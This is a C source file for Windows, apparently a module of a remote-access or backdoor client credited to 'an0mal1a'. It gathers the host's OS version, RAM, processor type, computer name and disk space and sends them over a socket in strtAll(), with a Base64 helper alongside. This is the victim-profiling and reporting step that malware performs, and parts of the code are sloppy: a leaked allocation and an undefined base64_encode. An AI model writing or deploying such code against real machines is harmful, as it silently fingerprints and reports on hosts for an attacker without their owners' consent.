#include <windows.h>

/*

  Creado por "an0mal1a"

       https://github.com/an0mal1a

*/

char* strSysrch();
char* CmtrSrch();
OSVERSIONINFO OsSrch();
MEMORYSTATUSEX MemSrch();
SYSTEM_INFO SysSrch();
char* dcdeStm(char* systemInfo);
char* strSysrch();

OSVERSIONINFO OsSrch(){
   OSVERSIONINFO osvi;
   ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
   osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
   GetVersionEx(&osvi);
   return osvi;
}

MEMORYSTATUSEX MemSrch(){
   MEMORYSTATUSEX statex;
   statex.dwLength = sizeof(statex);
   GlobalMemoryStatusEx(&statex);
   return statex; 
}


SYSTEM_INFO SysSrch(){
   SYSTEM_INFO siSysInfo;
   GetSystemInfo(&siSysInfo);
   return siSysInfo;
}


char* CmtrSrch(){
   char* computerName = (char*) malloc((MAX_COMPUTERNAME_LENGTH + 1) * sizeof(char));
   DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
   GetComputerName(computerName, &size);
   return computerName;
}


typedef struct {
   ULARGE_INTEGER totalNumberOfBytes;
   ULARGE_INTEGER totalNumberOfFreeBytes;

} DskSpaceInfo;

DskSpaceInfo  DskSrch(){
   ULARGE_INTEGER freeBytesAvailableToCaller;
   DskSpaceInfo diskSpaceInfo;

   GetDiskFreeSpaceEx("C:\\", &freeBytesAvailableToCaller, &diskSpaceInfo.totalNumberOfBytes, &diskSpaceInfo.totalNumberOfFreeBytes);
   return diskSpaceInfo;
}

char* dcdeStm(char* systemInfo){
    char* systemInfoEncode = malloc(strlen(systemInfo) + 1);
    size_t size1 = strlen(systemInfo);
    systemInfoEncode = base64_encode(systemInfo, size1, &size1);
    return systemInfoEncode;

}


char* strSysrch(){
   char* infoSys = malloc(1000 * sizeof(char)); 
   infoSys[0] = '\0';

   OSVERSIONINFO osvi = OsSrch(); 
   sprintf(infoSys + strlen(infoSys), "\n\t\tWindows version: %d.%d\n\n", osvi.dwMajorVersion, osvi.dwMinorVersion);

   MEMORYSTATUSEX statex = MemSrch(); 
   sprintf(infoSys + strlen(infoSys), "\t| Total RAM memory:\t %llu GB\n", ((statex.ullTotalPhys / 1024) / 1024) / 1024);

   SYSTEM_INFO siSysInfo = SysSrch(); 
   sprintf(infoSys + strlen(infoSys), "\t| Processor type:\t %u\n", siSysInfo.dwProcessorType);

   char* cmptrNme = CmtrSrch(); 
   sprintf(infoSys + strlen(infoSys), "\t| Node name:\t %s\n", cmptrNme);
   free (cmptrNme);

   DskSpaceInfo info = DskSrch(); 
   sprintf(infoSys + strlen(infoSys), "\t| Total disk space:\t %llu GB\n", info.totalNumberOfBytes.QuadPart / (1024 * 1024 * 1024));
   sprintf(infoSys + strlen(infoSys), "\t| Free disk space:\t %llu GB\n\n", info.totalNumberOfFreeBytes.QuadPart / (1024 * 1024 * 1024));

   return infoSys;
}

int strtAll(SOCKET conn){
   char *sinf = strSysrch(); 

   send(conn, sinf, strlen(sinf), 0);
   free(sinf);
   Sleep(300);
   return 0;
}
